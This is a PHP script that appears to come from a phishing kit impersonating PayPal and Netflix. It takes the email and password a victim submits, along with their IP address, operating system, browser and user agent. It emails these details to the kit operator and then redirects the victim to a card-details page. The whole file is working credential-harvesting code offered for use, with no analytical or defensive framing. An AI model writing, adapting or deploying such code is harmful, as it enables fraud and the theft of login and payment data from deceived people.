<?php

	session_start();
	include("../../../assest/browsers.php");
	include("../../../assest/conf.php");
	
		$ip = getenv("REMOTE_ADDR");
		
		$Email = $_POST["ppemail"];
		
		$Password = $_POST["pppassword"];
		
		if(!empty($Email) && !empty($Password)){
			
			$Subject = "PPL  -  Netflix $ip ";
		
			$Content = "User Name :  ".$Email."\r\n";
			
			$Content .= "Password : ".$Password."\r\n";
					
			$Content .= "IP : " .$_SERVER['REMOTE_ADDR']."\r\n";
			
			$Content .= "OS : " .$user_os."\r\n";
			
			$Content .= "Browser : " .$user_browser."\r\n";
			
			$Content .= "Agent : " .$_SERVER['HTTP_USER_AGENT']."\r\n";
			
			$MailHeaders = "From: contact@tvservices.uk\r\n";
		
			mail($to, $Subject, $Content, $MailHeaders);
			
			header("Location:../Cards.php");
			
		}
?>